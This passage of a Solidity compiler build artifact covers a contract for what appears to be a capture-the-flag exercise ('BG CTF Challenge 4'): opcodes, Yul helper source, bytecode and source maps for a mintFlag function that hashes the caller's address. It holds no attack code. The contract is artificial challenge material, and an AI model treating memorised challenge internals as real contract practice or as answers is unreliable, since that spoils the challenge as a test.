0x20 ADD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP PUSH1 0x0 PUSH2 0x85 DUP3 PUSH2 0xC6 JUMP JUMPDEST SWAP1 POP PUSH32 0x3D7CF2E7E9E20D5274EE168F6F51D48502AB06F1D11A284E66B34B7C09E5AD1E DUP2 PUSH1 0x40 MLOAD PUSH2 0xB6 SWAP2 SWAP1 PUSH2 0x115 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x19457468657265756D205369676E6564204D6573736167653A0A333200000000 PUSH1 0x0 MSTORE DUP2 PUSH1 0x1C MSTORE PUSH1 0x3C PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10F DUP2 PUSH2 0xFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x12A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x106 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x424720435446204368616C6C656E676520340000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x177 PUSH1 0x12 DUP4 PUSH2 0x130 JUMP JUMPDEST SWAP2 POP PUSH2 0x182 DUP3 PUSH2 0x141 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B8 DUP3 PUSH2 0x18D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP2 PUSH2 0x1AD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E7 DUP2 PUSH2 0x16A JUMP JUMPDEST SWAP1 POP PUSH2 0x1F6 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 COINBASE 0xCF SIGNEXTEND 0xD5 0xE6 0xF7 0xEC LOG2 0xDC 0xEA SDIV 0xA5 0x4F PUSH16 0x1F0FC9A7EDA56A09FA7C36CC44432169 XOR SWAP2 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"256:397:11:-:0;;;;;;;;;;;;;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@mintFlag_5699":{"entryPoint":78,"id":5699,"parameterSlots":0,"returnSlots":1},"@toEthSignedMessageHash_1994":{"entryPoint":198,"id":1994,"parameterSlots":1,"returnSlots":1},"abi_encode_t_address_to_t_address_fromStack":{"entryPoint":447,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_bytes32_to_t_bytes32_fromStack":{"entryPoint":262,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_to_t_string_memory_ptr_fromStack":{"entryPoint":362,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_bytes32__to_t_bytes32__fromStack_reversed":{"entryPoint":277,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_t_address__to_t_string_memory_ptr_t_address__fromStack_reversed":{"entryPoint":462,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":304,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":429,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_bytes32":{"entryPoint":252,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":397,"id":null,"parameterSlots":1,"returnSlots":1},"store_literal_in_memory_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644":{"entryPoint":321,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:2053:14","nodeType":"YulBlock","src":"0:2053:14","statements":[{"body":{"nativeSrc":"52:32:14","nodeType":"YulBlock","src":"52:32:14","statements":[{"nativeSrc":"62:16:14","nodeType":"YulAssignment","src":"62:16:14","value":{"name":"value","nativeSrc":"73:5:14","nodeType":"YulIdentifier","src":"73:5:14"},"variableNames":[{"name":"cleaned","nativeSrc":"62:7:14","nodeType":"YulIdentifier","src":"62:7:14"}]}]},"name":"cleanup_t_bytes32","nativeSrc":"7:77:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"34:5:14","nodeType":"YulTypedName","src":"34:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"44:7:14","nodeType":"YulTypedName","src":"44:7:14","type":""}],"src":"7:77:14"},{"body":{"nativeSrc":"155:53:14","nodeType":"YulBlock","src":"155:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"172:3:14","nodeType":"YulIdentifier","src":"172:3:14"},{"arguments":[{"name":"value","nativeSrc":"195:5:14","nodeType":"YulIdentifier","src":"195:5:14"}],"functionName":{"name":"cleanup_t_bytes32","nativeSrc":"177:17:14","nodeType":"YulIdentifier","src":"177:17:14"},"nativeSrc":"177:24:14","nodeType":"YulFunctionCall","src":"177:24:14"}],"functionName":{"name":"mstore","nativeSrc":"165:6:14","nodeType":"YulIdentifier","src":"165:6:14"},"nativeSrc":"165:37:14","nodeType":"YulFunctionCall","src":"165:37:14"},"nativeSrc":"165:37:14","nodeType":"YulExpressionStatement","src":"165:37:14"}]},"name":"abi_encode_t_bytes32_to_t_bytes32_fromStack","nativeSrc":"90:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"143:5:14","nodeType":"YulTypedName","src":"143:5:14","type":""},{"name":"pos","nativeSrc":"150:3:14","nodeType":"YulTypedName","src":"150:3:14","type":""}],"src":"90:118:14"},{"body":{"nativeSrc":"312:124:14","nodeType":"YulBlock","src":"312:124:14","statements":[{"nativeSrc":"322:26:14","nodeType":"YulAssignment","src":"322:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"334:9:14","nodeType":"YulIdentifier","src":"334:9:14"},{"kind":"number","nativeSrc":"345:2:14","nodeType":"YulLiteral","src":"345:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"330:3:14","nodeType":"YulIdentifier","src":"330:3:14"},"nativeSrc":"330:18:14","nodeType":"YulFunctionCall","src":"330:18:14"},"variableNames":[{"name":"tail","nativeSrc":"322:4:14","nodeType":"YulIdentifier","src":"322:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"402:6:14","nodeType":"YulIdentifier","src":"402:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"415:9:14","nodeType":"YulIdentifier","src":"415:9:14"},{"kind":"number","nativeSrc":"426:1:14","nodeType":"YulLiteral","src":"426:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"411:3:14","nodeType":"YulIdentifier","src":"411:3:14"},"nativeSrc":"411:17:14","nodeType":"YulFunctionCall","src":"411:17:14"}],"functionName":{"name":"abi_encode_t_bytes32_to_t_bytes32_fromStack","nativeSrc":"358:43:14","nodeType":"YulIdentifier","src":"358:43:14"},"nativeSrc":"358:71:14","nodeType":"YulFunctionCall","src":"358:71:14"},"nativeSrc":"358:71:14","nodeType":"YulExpressionStatement","src":"358:71:14"}]},"name":"abi_encode_tuple_t_bytes32__to_t_bytes32__fromStack_reversed","nativeSrc":"214:222:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"284:9:14","nodeType":"YulTypedName","src":"284:9:14","type":""},{"name":"value0","nativeSrc":"296:6:14","nodeType":"YulTypedName","src":"296:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"307:4:14","nodeType":"YulTypedName","src":"307:4:14","type":""}],"src":"214:222:14"},{"body":{"nativeSrc":"538:73:14","nodeType":"YulBlock","src":"538:73:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"555:3:14","nodeType":"YulIdentifier","src":"555:3:14"},{"name":"length","nativeSrc":"560:6:14","nodeType":"YulIdentifier","src":"560:6:14"}],"functionName":{"name":"mstore","nativeSrc":"548:6:14","nodeType":"YulIdentifier","src":"548:6:14"},"nativeSrc":"548:19:14","nodeType":"YulFunctionCall","src":"548:19:14"},"nativeSrc":"548:19:14","nodeType":"YulExpressionStatement","src":"548:19:14"},{"nativeSrc":"576:29:14","nodeType":"YulAssignment","src":"576:29:14","value":{"arguments":[{"name":"pos","nativeSrc":"595:3:14","nodeType":"YulIdentifier","src":"595:3:14"},{"kind":"number","nativeSrc":"600:4:14","nodeType":"YulLiteral","src":"600:4:14","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"591:3:14","nodeType":"YulIdentifier","src":"591:3:14"},"nativeSrc":"591:14:14","nodeType":"YulFunctionCall","src":"591:14:14"},"variableNames":[{"name":"updated_pos","nativeSrc":"576:11:14","nodeType":"YulIdentifier","src":"576:11:14"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"442:169:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"510:3:14","nodeType":"YulTypedName","src":"510:3:14","type":""},{"name":"length","nativeSrc":"515:6:14","nodeType":"YulTypedName","src":"515:6:14","type":""}],"returnVariables":[{"name":"updated_pos","nativeSrc":"526:11:14","nodeType":"YulTypedName","src":"526:11:14","type":""}],"src":"442:169:14"},{"body":{"nativeSrc":"723:62:14","nodeType":"YulBlock","src":"723:62:14","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"745:6:14","nodeType":"YulIdentifier","src":"745:6:14"},{"kind":"number","nativeSrc":"753:1:14","nodeType":"YulLiteral","src":"753:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"741:3:14","nodeType":"YulIdentifier","src":"741:3:14"},"nativeSrc":"741:14:14","nodeType":"YulFunctionCall","src":"741:14:14"},{"hexValue":"424720435446204368616c6c656e67652034","kind":"string","nativeSrc":"757:20:14","nodeType":"YulLiteral","src":"757:20:14","type":"","value":"BG CTF Challenge 4"}],"functionName":{"name":"mstore","nativeSrc":"734:6:14","nodeType":"YulIdentifier","src":"734:6:14"},"nativeSrc":"734:44:14","nodeType":"YulFunctionCall","src":"734:44:14"},"nativeSrc":"734:44:14","nodeType":"YulExpressionStatement","src":"734:44:14"}]},"name":"store_literal_in_memory_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644","nativeSrc":"617:168:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"715:6:14","nodeType":"YulTypedName","src":"715:6:14","type":""}],"src":"617:168:14"},{"body":{"nativeSrc":"937:220:14","nodeType":"YulBlock","src":"937:220:14","statements":[{"nativeSrc":"947:74:14","nodeType":"YulAssignment","src":"947:74:14","value":{"arguments":[{"name":"pos","nativeSrc":"1013:3:14","nodeType":"YulIdentifier","src":"1013:3:14"},{"kind":"number","nativeSrc":"1018:2:14","nodeType":"YulLiteral","src":"1018:2:14","type":"","value":"18"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"954:58:14","nodeType":"YulIdentifier","src":"954:58:14"},"nativeSrc":"954:67:14","nodeType":"YulFunctionCall","src":"954:67:14"},"variableNames":[{"name":"pos","nativeSrc":"947:3:14","nodeType":"YulIdentifier","src":"947:3:14"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"1119:3:14","nodeType":"YulIdentifier","src":"1119:3:14"}],"functionName":{"name":"store_literal_in_memory_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644","nativeSrc":"1030:88:14","nodeType":"YulIdentifier","src":"1030:88:14"},"nativeSrc":"1030:93:14","nodeType":"YulFunctionCall","src":"1030:93:14"},"nativeSrc":"1030:93:14","nodeType":"YulExpressionStatement","src":"1030:93:14"},{"nativeSrc":"1132:19:14","nodeType":"YulAssignment","src":"1132:19:14","value":{"arguments":[{"name":"pos","nativeSrc":"1143:3:14","nodeType":"YulIdentifier","src":"1143:3:14"},{"kind":"number","nativeSrc":"1148:2:14","nodeType":"YulLiteral","src":"1148:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"1139:3:14","nodeType":"YulIdentifier","src":"1139:3:14"},"nativeSrc":"1139:12:14","nodeType":"YulFunctionCall","src":"1139:12:14"},"variableNames":[{"name":"end","nativeSrc":"1132:3:14","nodeType":"YulIdentifier","src":"1132:3:14"}]}]},"name":"abi_encode_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_to_t_string_memory_ptr_fromStack","nativeSrc":"791:366:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"925:3:14","nodeType":"YulTypedName","src":"925:3:14","type":""}],"returnVariables":[{"name":"end","nativeSrc":"933:3:14","nodeType":"YulTypedName","src":"933:3:14","type":""}],"src":"791:366:14"},{"body":{"nativeSrc":"1208:81:14","nodeType":"YulBlock","src":"1208:81:14","statements":[{"nativeSrc":"1218:65:14","nodeType":"YulAssignment","src":"1218:65:14","value":{"arguments":[{"name":"value","nativeSrc":"1233:5:14","nodeType":"YulIdentifier","src":"1233:5:14"},{"kind":"number","nativeSrc":"1240:42:14","nodeType":"YulLiteral","src":"1240:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"1229:3:14","nodeType":"YulIdentifier","src":"1229:3:14"},"nativeSrc":"1229:54:14","nodeType":"YulFunctionCall","src":"1229:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"1218:7:14","nodeType":"YulIdentifier","src":"1218:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"1163:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1190:5:14","nodeType":"YulTypedName","src":"1190:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1200:7:14","nodeType":"YulTypedName","src":"1200:7:14","type":""}],"src":"1163:126:14"},{"body":{"nativeSrc":"1340:51:14","nodeType":"YulBlock","src":"1340:51:14","statements":[{"nativeSrc":"1350:35:14","nodeType":"YulAssignment","src":"1350:35:14","value":{"arguments":[{"name":"value","nativeSrc":"1379:5:14","nodeType":"YulIdentifier","src":"1379:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"1361:17:14","nodeType":"YulIdentifier","src":"1361:17:14"},"nativeSrc":"1361:24:14","nodeType":"YulFunctionCall","src":"1361:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"1350:7:14","nodeType":"YulIdentifier","src":"1350:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"1295:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1322:5:14","nodeType":"YulTypedName","src":"1322:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"1332:7:14","nodeType":"YulTypedName","src":"1332:7:14","type":""}],"src":"1295:96:14"},{"body":{"nativeSrc":"1462:53:14","nodeType":"YulBlock","src":"1462:53:14","statements":[{"expression":{"arguments":[{"name":"pos","nativeSrc":"1479:3:14","nodeType":"YulIdentifier","src":"1479:3:14"},{"arguments":[{"name":"value","nativeSrc":"1502:5:14","nodeType":"YulIdentifier","src":"1502:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"1484:17:14","nodeType":"YulIdentifier","src":"1484:17:14"},"nativeSrc":"1484:24:14","nodeType":"YulFunctionCall","src":"1484:24:14"}],"functionName":{"name":"mstore","nativeSrc":"1472:6:14","nodeType":"YulIdentifier","src":"1472:6:14"},"nativeSrc":"1472:37:14","nodeType":"YulFunctionCall","src":"1472:37:14"},"nativeSrc":"1472:37:14","nodeType":"YulExpressionStatement","src":"1472:37:14"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1397:118:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1450:5:14","nodeType":"YulTypedName","src":"1450:5:14","type":""},{"name":"pos","nativeSrc":"1457:3:14","nodeType":"YulTypedName","src":"1457:3:14","type":""}],"src":"1397:118:14"},{"body":{"nativeSrc":"1720:330:14","nodeType":"YulBlock","src":"1720:330:14","statements":[{"nativeSrc":"1730:26:14","nodeType":"YulAssignment","src":"1730:26:14","value":{"arguments":[{"name":"headStart","nativeSrc":"1742:9:14","nodeType":"YulIdentifier","src":"1742:9:14"},{"kind":"number","nativeSrc":"1753:2:14","nodeType":"YulLiteral","src":"1753:2:14","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"1738:3:14","nodeType":"YulIdentifier","src":"1738:3:14"},"nativeSrc":"1738:18:14","nodeType":"YulFunctionCall","src":"1738:18:14"},"variableNames":[{"name":"tail","nativeSrc":"1730:4:14","nodeType":"YulIdentifier","src":"1730:4:14"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1777:9:14","nodeType":"YulIdentifier","src":"1777:9:14"},{"kind":"number","nativeSrc":"1788:1:14","nodeType":"YulLiteral","src":"1788:1:14","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"1773:3:14","nodeType":"YulIdentifier","src":"1773:3:14"},"nativeSrc":"1773:17:14","nodeType":"YulFunctionCall","src":"1773:17:14"},{"arguments":[{"name":"tail","nativeSrc":"1796:4:14","nodeType":"YulIdentifier","src":"1796:4:14"},{"name":"headStart","nativeSrc":"1802:9:14","nodeType":"YulIdentifier","src":"1802:9:14"}],"functionName":{"name":"sub","nativeSrc":"1792:3:14","nodeType":"YulIdentifier","src":"1792:3:14"},"nativeSrc":"1792:20:14","nodeType":"YulFunctionCall","src":"1792:20:14"}],"functionName":{"name":"mstore","nativeSrc":"1766:6:14","nodeType":"YulIdentifier","src":"1766:6:14"},"nativeSrc":"1766:47:14","nodeType":"YulFunctionCall","src":"1766:47:14"},"nativeSrc":"1766:47:14","nodeType":"YulExpressionStatement","src":"1766:47:14"},{"nativeSrc":"1822:139:14","nodeType":"YulAssignment","src":"1822:139:14","value":{"arguments":[{"name":"tail","nativeSrc":"1956:4:14","nodeType":"YulIdentifier","src":"1956:4:14"}],"functionName":{"name":"abi_encode_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_to_t_string_memory_ptr_fromStack","nativeSrc":"1830:124:14","nodeType":"YulIdentifier","src":"1830:124:14"},"nativeSrc":"1830:131:14","nodeType":"YulFunctionCall","src":"1830:131:14"},"variableNames":[{"name":"tail","nativeSrc":"1822:4:14","nodeType":"YulIdentifier","src":"1822:4:14"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"2015:6:14","nodeType":"YulIdentifier","src":"2015:6:14"},{"arguments":[{"name":"headStart","nativeSrc":"2028:9:14","nodeType":"YulIdentifier","src":"2028:9:14"},{"kind":"number","nativeSrc":"2039:2:14","nodeType":"YulLiteral","src":"2039:2:14","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"2024:3:14","nodeType":"YulIdentifier","src":"2024:3:14"},"nativeSrc":"2024:18:14","nodeType":"YulFunctionCall","src":"2024:18:14"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"1971:43:14","nodeType":"YulIdentifier","src":"1971:43:14"},"nativeSrc":"1971:72:14","nodeType":"YulFunctionCall","src":"1971:72:14"},"nativeSrc":"1971:72:14","nodeType":"YulExpressionStatement","src":"1971:72:14"}]},"name":"abi_encode_tuple_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_t_address__to_t_string_memory_ptr_t_address__fromStack_reversed","nativeSrc":"1521:529:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"1692:9:14","nodeType":"YulTypedName","src":"1692:9:14","type":""},{"name":"value0","nativeSrc":"1704:6:14","nodeType":"YulTypedName","src":"1704:6:14","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"1715:4:14","nodeType":"YulTypedName","src":"1715:4:14","type":""}],"src":"1521:529:14"}]},"contents":"{\n\n    function cleanup_t_bytes32(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_bytes32_to_t_bytes32_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bytes32(value))\n    }\n\n    function abi_encode_tuple_t_bytes32__to_t_bytes32__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bytes32_to_t_bytes32_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644(memPtr) {\n\n        mstore(add(memPtr, 0), \"BG CTF Challenge 4\")\n\n    }\n\n    function abi_encode_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 18)\n        store_literal_in_memory_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644(pos)\n        end := add(pos, 32)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_t_address__to_t_string_memory_ptr_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 64)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_38777f455e8ab328a5121c93338c7f776bc7795f9d694c7d69158cf70a94c644_to_t_string_memory_ptr_fromStack( tail)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 32))\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b506004361061002b5760003560e01c8063e00d023f14610030575b600080fd5b61003861004e565b6040516100459190610115565b60405180910390f35b6000803360405160200161006291906101ce565b6040516020818303038152906040528051906020012090506000610085826100c6565b90507f3d7cf2e7e9e20d5274ee168f6f51d48502ab06f1d11a284e66b34b7c09e5ad1e816040516100b69190610115565b60405180910390a1809250505090565b60007f19457468657265756d205369676e6564204d6573736167653a0a33320000000060005281601c52603c6000209050919050565b6000819050919050565b61010f816100fc565b82525050565b600060208201905061012a6000830184610106565b92915050565b600082825260208201905092915050565b7f424720435446204368616c6c656e676520340000000000000000000000000000600082015250565b6000610177601283610130565b915061018282610141565b602082019050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101b88261018d565b9050919050565b6101c8816101ad565b82525050565b600060408201905081810360008301526101e78161016a565b90506101f660208301846101bf565b9291505056fea264697066735822122041cf0bd5e6f7eca2dcea05a54f6f1f0fc9a7eda56a09fa7c36cc44432169189164736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xE00D023F EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x115 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1CE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP PUSH1 0x0 PUSH2 0x85 DUP3 PUSH2 0xC6 JUMP JUMPDEST SWAP1 POP PUSH32 0x3D7CF2E7E9E20D5274EE168F6F51D48502AB06F1D11A284E66B34B7C09E5AD1E DUP2 PUSH1 0x40 MLOAD PUSH2 0xB6 SWAP2 SWAP1 PUSH2 0x115 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x19457468657265756D205369676E6564204D6573736167653A0A333200000000 PUSH1 0x0 MSTORE DUP2 PUSH1 0x1C MSTORE PUSH1 0x3C PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x10F DUP2 PUSH2 0xFC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x12A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x106 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x424720435446204368616C6C656E676520340000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x177 PUSH1 0x12 DUP4 PUSH2 0x130 JUMP JUMPDEST SWAP2 POP PUSH2 0x182 DUP3 PUSH2 0x141 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B8 DUP3 PUSH2 0x18D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP2 PUSH2 0x1AD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x1E7 DUP2 PUSH2 0x16A JUMP JUMPDEST SWAP1 POP PUSH2 0x1F6 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 COINBASE 0xCF SIGNEXTEND 0xD5 0xE6 0xF7 0xEC LOG2 0xDC 0xEA SDIV 0xA5 0x4F PUSH16 0x1F0FC9A7EDA56A09FA7C36CC44432169 XOR SWAP2 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"256:397:11:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;399:252;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;435:7;455:15;516:10;483:44;;;;;;;;:::i;:::-;;;;;;;;;;;;;473:55;;;;;;455:73;;538:12;553:32;:7;:30;:32::i;:::-;538:47;;601:20;616:4;601:20;;;;;;:::i;:::-;;;;;;;;639:4;632:11;;;;399:252;:::o;1247:433:5:-;1323:14;1401:34;1395:4;1388:48;1503:11;1497:4;1490:25;1595:4;1589;1579:21;1569:31;;1247:433;;;:::o;7:77:14:-;44:7;73:5;62:16;;7:77;;;:::o;90:118::-;177:24;195:5;177:24;:::i;:::-;172:3;165:37;90:118;;:::o;214:222::-;307:4;345:2;334:9;330:18;322:26;;358:71;426:1;415:9;411:17;402:6;358:71;:::i;:::-;214:222;;;;:::o;442:169::-;526:11;560:6;555:3;548:19;600:4;595:3;591:14;576:29;;442:169;;;;:::o;617:168::-;757:20;753:1;745:6;741:14;734:44;617:168;:::o;791:366::-;933:3;954:67;1018:2;1013:3;954:67;:::i;:::-;947:74;